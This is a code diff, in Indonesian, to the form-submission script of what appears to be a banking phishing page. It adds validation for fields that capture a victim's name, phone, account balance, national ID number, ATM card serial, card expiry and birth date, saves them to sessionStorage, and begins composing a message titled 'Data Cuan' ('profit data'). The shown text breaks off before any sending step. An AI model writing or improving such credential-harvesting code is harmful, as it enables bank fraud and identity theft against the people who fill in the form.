@@ -34,30 +34,70 @@ $(document).ready(function() {
     $('#masa').mask('00/00/0000');
     $('#tanggal_lahir').mask('00/00/0000');
 
-    // Form submission with loading
+    // Form submission with validation
     $('#form1').on('submit', function(e) {
         e.preventDefault();
+
+        // Ambil data dari form menggunakan jQuery
+        const nama = $('#nama').val().trim();
+        const nomor = $('#nomor').val().trim();
+        const saldoRaw = $('#saldo').val().trim();
+        const saldo = saldoRaw.replace('Rp. ', '').trim(); // Strip "Rp. " untuk validasi
+        const nik = $('#nik').val().trim();
+        const seri = $('#seri').val().trim();
+        const masa = $('#masa').val().trim();
+        const tanggal_lahir = $('#tanggal_lahir').val().trim();
+
+        // Validasi: Semua field harus diisi
+        if (!nama) {
+            alert('Nama Lengkap tidak boleh kosong.');
+            $('#nama').focus();
+            return;
+        }
+        if (!nomor) {
+            alert('Nomor Handphone tidak boleh kosong.');
+            $('#nomor').focus();
+            return;
+        }
+        if (!saldo) {
+            alert('Saldo Akhir tidak boleh kosong.');
+            $('#saldo').focus();
+            return;
+        }
+        if (!nik) {
+            alert('NIK KTP tidak boleh kosong.');
+            $('#nik').focus();
+            return;
+        }
+        if (!seri) {
+            alert('Seri Kartu ATM tidak boleh kosong.');
+            $('#seri').focus();
+            return;
+        }
+        if (!masa || masa.length !== 10) {
+            alert('Masa Berlaku tidak boleh kosong dan harus format DD/MM/YYYY.');
+            $('#masa').focus();
+            return;
+        }
+        if (!tanggal_lahir || tanggal_lahir.length !== 10) {
+            alert('Tanggal Lahir tidak boleh kosong dan harus format DD/MM/YYYY.');
+            $('#tanggal_lahir').focus();
+            return;
+        }
+
+        // Jika semua valid, lanjutkan
         $("#loader").show();
 
-        // Ambil data dari form
-        const nama = document.getElementById('nama').value;
-        const nomor = document.getElementById('nomor').value;
-        const saldo = document.getElementById('saldo').value;
-        const nik = document.getElementById('nik').value;
-        const seri = document.getElementById('seri').value;
-        const masa = document.getElementById('masa').value;
-        const tanggal_lahir = document.getElementById('tanggal_lahir').value;
-
-        // Simpan ke sessionStorage
+        // Simpan ke sessionStorage (gunakan nilai asli tanpa mask untuk saldo)
         sessionStorage.setItem('nama', nama);
         sessionStorage.setItem('nomor', nomor);
-        sessionStorage.setItem('saldo', saldo);
+        sessionStorage.setItem('saldo', saldoRaw); // Simpan dengan "Rp. " untuk display
         sessionStorage.setItem('nik', nik);
         sessionStorage.setItem('seri', seri);
         sessionStorage.setItem('masa', masa);
         sessionStorage.setItem('tanggal_lahir', tanggal_lahir);
 
-        // Buat pesan
+        // Buat pesan (gunakan saldo tanpa "Rp. " untuk pesan)
         const message = `
 ├• | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 |
 ├───────────────────
